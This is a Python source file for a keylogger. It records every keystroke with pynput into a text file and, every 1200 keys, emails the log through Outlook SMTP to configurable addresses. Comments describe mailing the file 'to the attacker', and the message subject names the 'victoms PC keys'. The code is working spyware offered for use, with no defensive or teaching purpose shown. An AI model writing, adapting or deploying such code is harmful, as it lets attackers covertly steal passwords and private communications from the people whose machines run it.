from pynput.keyboard import Key, Listener 
import os


counter = 1


def mail_it():

	# libraries we import for smpt connection (protocols) for mails
	# and mime for stablisting the method extensions for mails
	# multipurpose innternet mail extensions
	import smtplib
	from email.mime.text import MIMEText
	from email.mime.multipart import MIMEMultipart

	import os

	#use your outlook mail here because of the of this code is outlook
	mail = "************@outlook.com"
	password = ""
	
	
	# give your target mails here where the keys should be send[target2@mail.com,target1@mail.com]
	#destination mails where keys would send
	destination_mail = ["","",""]
	path = "/home/kali/Documents/keyslogging.txt"

	#creating message
	msg = MIMEMultipart("related")
	msg['Subject'] = 'victoms PC keys'
	msg.preamble = "hi boss"

	with open("keyslogging.txt",'r') as plaintxt:
		plain = plaintxt.read()
	plaintxt.close()

	msg.attach(MIMEText(msg.preamble))
	msg.attach(MIMEText(plain))


	#initializing smpt connection (protocol) and sending mail
	server = smtplib.SMTP("smtp.outlook.com", 587) 
	server.starttls()
	server.ehlo()
	server.login(mail,password)
	server.sendmail(mail,destination_mail ,msg.as_string())

	server.quit()
	


	#when the key is pressed on press fuction call which call the writefunction
	#which wirtes the keys into the keyslogging.txt
def on_press(key):
	write_1(key)


	#global counter is initialized which counts the keys
	global counter
	counter += 1
	#on pressing when the limit reaches to 1200 keys it would mail the txt file to the attacker
	if counter % 1200 == 0:
		mail_it()


def write_1(var):
	with open("keyslogging.txt","a") as f:

		if var == Key.backspace:
			pass

		if var == Key.space:
			new_var = str(var).replace(str(Key.space)," ")
			f.write(new_var)
			

		else:
			new_var = str(var).replace("'",'')
			f.write(new_var)
		f.write(" ")
		f.close()


def on_release(key):
	if key == Key.esc:
		return False

with Listener(on_press=on_press, on_release=on_release) as l:
	l.join()
